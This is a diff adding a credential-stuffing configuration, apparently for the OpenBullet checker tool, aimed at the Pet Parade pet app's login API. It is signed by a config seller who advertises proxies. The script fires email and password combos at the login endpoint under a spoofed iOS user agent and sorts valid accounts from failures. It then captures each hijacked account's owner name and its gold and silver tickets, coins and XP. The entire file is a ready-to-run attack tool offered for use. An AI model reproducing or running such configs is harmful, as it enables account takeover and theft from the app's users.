@@ -1,0 +1,92 @@
+[SETTINGS]
+{
+  "Name": "Pet Parade {GIFT CARDS}",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-10-19T00:26:18.4930579-07:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@MasterLordConfigs",
+  "Version": "1.0.1 [CB]",
+  "Descriptions": "",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "IF YOU HAVE AZURE OR AWS PORTALS AND NEED VHQ PROXY + CONFIGS > @MasterLord007",
+      "VariableName": "",
+      "Id": 1663504384
+    },
+    {
+      "Description": "JOIN > @MasterLordConfigs",
+      "VariableName": "",
+      "Id": 352206619
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://api.parade.pet/auth/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.parade.pet" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: PetParade/2.1.16 (com.goodboystudios.petparade; build:1678; iOS 12.4.3) Alamofire/4.9.1" 
+  HEADER "Accept-Language: en-US;q=1.0, ar-US;q=0.9" 
+  HEADER "Content-Length: 56" 
+  HEADER "Accept-Encoding: gzip;q=1.0, compress;q=0.5" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "location" 
+  KEYCHAIN Failure OR 
+    KEY "Arrr-roof! That email and password did not work.  Please try again." 
+    KEY "username and password required" 
+
+#FIRST_NAME PARSE "<SOURCE>" JSON "firstName" CreateEmpty=FALSE -> CAP "First Name" 
+
+#LAST_NAME PARSE "<SOURCE>" JSON "lastName" CreateEmpty=FALSE -> CAP "Last Name" 
+
+#GOLD_TICKETS PARSE "<SOURCE>" LR "goldTickets\":" "," CreateEmpty=FALSE -> CAP "Gold Tickets" 
+
+#SILVER_TICKETS PARSE "<SOURCE>" LR "silverTickets\":" "," CreateEmpty=FALSE -> CAP "Silver Tickets" 
+
+#GOLD_COINS PARSE "<SOURCE>" LR "goldCoins\":" "," CreateEmpty=FALSE -> CAP "Gold Coins" 
+
+#SILVER_COINS PARSE "<SOURCE>" LR "silverCoins\":" "," CreateEmpty=FALSE -> CAP "Silver Coins" 
+
+#TOTAL_XP PARSE "<SOURCE>" LR "totalXP\":" "," CreateEmpty=FALSE -> CAP "Total XP" 
+
+#CREATOR FUNCTION Constant "@MasterLordConfigs" -> CAP "Config By" 
+
